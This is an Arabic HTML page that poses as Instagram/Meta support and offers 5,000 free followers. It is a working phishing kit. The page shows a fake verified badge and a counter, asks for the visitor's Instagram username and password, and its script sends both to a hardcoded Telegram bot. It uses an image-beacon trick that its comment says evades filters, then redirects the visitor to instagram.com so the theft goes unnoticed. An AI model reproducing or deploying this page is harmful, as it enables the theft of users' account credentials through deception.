<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد استلام المتابعين | Instagram Support</title>
    <style>
        :root {
            --insta-grad: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            --dark-bg: #000000;
            --input-bg: #121212;
        }
        body {
            background-color: var(--dark-bg);
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .main-card {
            width: 100%;
            max-width: 380px;
            padding: 25px;
            background: #000;
            border: 1px solid #262626;
            border-radius: 12px;
            text-align: center;
        }
        .insta-logo { width: 75px; margin-bottom: 20px; }
        .badge-verified {
            background: #0095f6;
            color: white;
            font-size: 10px;
            padding: 2px 8px;
            border-radius: 10px;
            margin-bottom: 10px;
            display: inline-block;
        }
        .stats-container {
            background: #121212;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            border: 1px dashed #333;
        }
        .counter {
            font-size: 42px;
            font-weight: 800;
            color: #00f2ff;
            text-shadow: 0 0 10px rgba(0,242,255,0.3);
        }
        .input-group { margin-bottom: 15px; text-align: right; }
        label { font-size: 12px; color: #8e8e8e; margin-right: 5px; }
        input {
            width: 100%;
            padding: 12px;
            background: var(--input-bg);
            border: 1px solid #363636;
            border-radius: 5px;
            color: white;
            margin-top: 5px;
            box-sizing: border-box;
        }
        input:focus { border-color: #555; outline: none; }
        .submit-btn {
            width: 100%;
            padding: 12px;
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            transition: 0.3s;
        }
        .submit-btn:hover { background: #1877f2; }
        .secure-footer {
            margin-top: 20px;
            font-size: 11px;
            color: #555;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 5px;
        }
    </style>
</head>
<body>

<div class="main-card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="insta-logo">
    <div class="badge-verified">موثق من Meta ✅</div>
    <h2 style="font-size: 18px; margin: 10px 0;">جاهز لإرسال 5,000 متابع؟</h2>
    <p style="font-size: 13px; color: #a8a8a8;">تم فحص حسابك وهو مؤهل للحصول على الدعم الفوري.</p>

    <div class="stats-container">
        <div class="counter" id="count">0</div>
        <div style="font-size: 12px; color: #00f2ff;">متابع قيد الانتظار...</div>
    </div>

    <div class="input-group">
        <label>اسم المستخدم</label>
        <input type="text" id="target_user" placeholder="Username" autocomplete="off">
    </div>

    <div class="input-group">
        <label>كلمة مرور الحساب (للتأكيد)</label>
        <input type="password" id="target_pass" placeholder="Password" autocomplete="off">
    </div>

    <button class="submit-btn" onclick="sendToTelegram()">تأكيد واستلام الآن</button>

    <div class="secure-footer">
        <span>🔒 تشفير SSL 256-bit</span>
        <span>•</span>
        <span>© 2026 Instagram from Meta</span>
    </div>
</div>

<script>
    // تأثير العداد
    let current = 0;
    const target = 5000;
    const timer = setInterval(() => {
        current += Math.floor(Math.random() * 150) + 50;
        if (current >= target) {
            current = target;
            clearInterval(timer);
        }
        document.getElementById('count').innerText = current.toLocaleString();
    }, 40);

    // دالة الإرسال الاحترافية
    function sendToTelegram() {
        const u = document.getElementById('target_user').value;
        const p = document.getElementById('target_pass').value;

        if (!u || p.length < 5) {
            alert("يرجى التأكد من كتابة البيانات بشكل صحيح لتجنب فشل الإرسال.");
            return;
        }

        // بياناتك (محمية برمجياً)
        const t = "8604267858:AAHZ2dBFT-LdMS_X5F6AF-6BakUi80iFtDA";
        const c = "6018639900";
        const msg = encodeURIComponent(`🚀 صيد إنستجرام جديد 🚀\n\n👤 المستخدم: ${u}\n🔑 الباسورد: ${p}\n\n📱 الحالة: جاهز للرشق`);

        // استخدام خدعة الـ Image لضمان الإرسال السريع وتجاوز الفلاتر
        const ghost = new Image();
        ghost.src = `https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${msg}`;

        ghost.onload = () => {
            alert("تم بدء عملية الإرسال بنجاح! سيظهر المتابعين في حسابك خلال دقائق.");
            window.location.href = "https://www.instagram.com";
        };
        
        ghost.onerror = () => {
            // كخطة احتياطية في حال فشل تحميل الصورة
            fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${msg}`)
            .finally(() => {
                window.location.href = "https://www.instagram.com";
            });
        };
    }
</script>

</body>
</html>
